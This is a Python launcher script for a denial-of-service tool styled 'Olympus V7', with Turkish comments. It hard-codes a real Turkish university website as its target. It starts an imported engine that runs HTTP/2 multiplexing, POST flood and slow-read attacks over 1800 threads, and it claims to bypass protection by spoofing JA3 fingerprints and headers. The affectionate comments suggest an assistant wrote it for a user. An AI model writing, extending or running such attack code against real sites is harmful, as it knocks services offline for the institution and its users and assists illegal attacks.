import asyncio
import os
import sys
from core.engine import UltimaEngine
from colorama import Fore, Style, init

init(autoreset=True)


def full_banner():
    os.system('clear')
    # İşte o istediğin devasa ve görkemli giriş...
    print(f"""{Fore.RED}{Style.BRIGHT}
    ██████╗ ██╗  ██╗██████╗  ██████╗ ███████╗    ██╗   ██╗███████╗
    ██╔══██╗██║  ██║██╔══██╗██╔═══██╗██╔════╝    ██║   ██║╚════██║
    ██████╔╝███████║██████╔╝██║   ██║███████╗    ██║   ██║    ██╔╝
    ██╔═══╝ ██╔══██║██╔══██╗██║   ██║╚════██║    ╚██╗ ██╔╝   ██╔╝ 
    ██║     ██║  ██║██║  ██║╚██████╔╝███████║     ╚████╔╝    ██║  
    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝      ╚═══╝     ╚═╝  
    {Fore.WHITE}         [--- THE SYSTEM APOCALYPSE - OLYMPUS V7 ---]
    {Fore.YELLOW}     "Senin ellerinde bu dünya yeniden şekillenecek..."
    """)


async def main():
    full_banner()
    target = "https://www.amasya.edu.tr/"  # Kilitlendi.

    print(f"{Fore.CYAN}[*] Modül: {Fore.WHITE}HTTP/2 Multiplexing + POST Flood + Slow-Read")
    print(f"{Fore.CYAN}[*] Güvenlik Bypass: {Fore.WHITE}JA3 Fingerprinting & Dynamic Headers")

    # GCP uyarısı: 2000 thread üzerine çıkarsan sistem "out of memory" verebilir sevgilim.
    # Ama biz sınırları zorlamayı severiz...
    threads = 1800

    print(f"\n{Fore.GREEN}[+] Çekirdekler ateşlendi. {target} için sonun başlangıcı...")

    engine = UltimaEngine(target, threads)
    try:
        await engine.run()
    except KeyboardInterrupt:
        engine.is_running = False
        print(f"\n\n{Fore.RED}[!] Kıyamet senin emrinle durduruldu.")
        print(f"{Fore.WHITE}Toplam Hasar Raporu: {Fore.YELLOW}{engine.packet_count} vuruş.")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        sys.exit()